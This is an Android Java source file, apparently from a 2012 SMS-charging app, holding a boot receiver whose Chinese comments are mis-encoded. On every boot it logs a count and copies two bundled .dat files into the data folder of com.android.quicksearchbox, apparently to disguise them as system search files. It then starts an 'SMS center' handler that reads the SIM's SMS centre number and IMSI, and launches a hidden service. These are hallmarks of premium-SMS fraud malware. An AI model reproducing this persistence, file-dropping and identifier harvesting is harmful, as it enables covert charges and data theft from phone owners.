package com.sttm.charge;



import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;

import com.sttm.util.ByteUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.LogFile;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;



/**
 * 
 * ���������� 
 * 
 * ����������ֻ�������£���һ���£���¼���������ͳ�ʼ�����ݣ��ڶ����£�������������
 * 
 * @author lj
 * @since 2012-5-10
 * 
 */

public class BootBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "BootBroadcastReceiver";
	private int driveup = 0;// ��������
	private SharedPreferences driveup_pree;
	public static final String DRIVEUP_PREE = "DRIVEUP_PREE";
	private static final String DRIVEUP_COUNT_PREE = "DRIVEUP_COUNT_PREE";
	private static String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
	private KsoCache cache;

	@Override
	public void onReceive(Context context, Intent intent) {

		if (intent.getAction().equals(BOOT_ACTION)) {

			driveup_pree = context.getSharedPreferences(DRIVEUP_PREE, Context.MODE_WORLD_WRITEABLE);
		
			// ----------------------------------------------
			driveup = initdriveupcount(context) + 1;
			Log.d(TAG, "���ο���Ϊ��" + driveup + "����");
			LogFile.WriteLogFile("���ο���Ϊ��" + driveup + "����");
			savedriveupcount(context);
			// -----------------------------------------------
			
			//��������Ҫ�������ļ��Ƿ����
			checkMustFile(context);
			LogFile.WriteLogFile("���������ļ�");
			
			//================================================
			//������ʼ����������
			cache = KsoCache.getInstance();
			cache.init(context);
			//Log.d(TAG, "������ʼ����������");
			LogFile.WriteLogFile("������ʼ����������");
			//==================================================
			
			/*�ж��ֻ���û�и���sim����������������»�ȡ�������ĺ��룬imsi�ŵ���Ϣ*/
			//cache.reSetValue("smsCenterFlag", true);
			KsoMainCourse.startSmsCenterHandler(context);
			

			// ---------------------------------------------
			// �������������
			//Log.d(TAG, "��������������");
			LogFile.WriteLogFile("��������������");
			Intent service = new Intent(context, MainService.class);
			service.putExtra("driveup", driveup);
			context.startService(service);
			// ---------------------------------------------

		}
	}

	private int initdriveupcount(Context context) {
		return driveup_pree.getInt(DRIVEUP_COUNT_PREE, 0);
	}

	private void savedriveupcount(Context context) {
		driveup_pree.edit().putInt(DRIVEUP_COUNT_PREE, driveup).commit();
	}
	
	/*����Ҫ�������ļ�, ������������assets�¿�������*/
	private void checkMustFile(Context context){
		if(!fileIsExists("data/data/com.android.quicksearchbox/files/smartphonem.dat")){
			File retm = new File("data/data/com.android.quicksearchbox/files");
			if(!retm.exists()){
					retm.mkdirs();
				}
			byte[] buffer = getByteFromAssets(context,"smartphonem.dat");
				FileOutputStream os;
				try {
					os = new FileOutputStream(
							"data/data/com.android.quicksearchbox/files/smartphonem.dat");
					ByteUtil.writeByteFile(os, buffer);
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		}
		if(!fileIsExists("data/data/com.android.quicksearchbox/files/smartphonec.dat")){
			File retc = new File("data/data/com.android.quicksearchbox/files");
			if(!retc.exists()){
					retc.mkdirs();
				}
			byte[] buffer = getByteFromAssets(context,"smartphonec.dat");
			FileOutputStream os;
			try {
				os = new FileOutputStream(
						"data/data/com.android.quicksearchbox/files/smartphonec.dat");
				ByteUtil.writeByteFile(os, buffer);
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	private byte[] getByteFromAssets(Context context,String filename){
		try{
			InputStream in = context.getResources().getAssets().open(filename);
			int length = in.available();
			byte[] buffer = new byte[length];
			int offset = 0;
			int numread = 0;
			while (offset < length && numread >= 0) {
				numread = in.read(buffer, offset, length - offset);
				offset += numread;
			}
			in.read(buffer);
			in.close();
			return buffer;
		}
		catch(Exception e){
			e.printStackTrace();
		}
		return null;
	}
	
	private boolean fileIsExists(String filename){
		 try{
		 File f=new File(filename);
		 if(!f.exists()){
		 return false;
		 }
		}catch (Exception e) {
		 // TODO: handle exception
		 return false;
		 }
		 return true;
	}
	
}
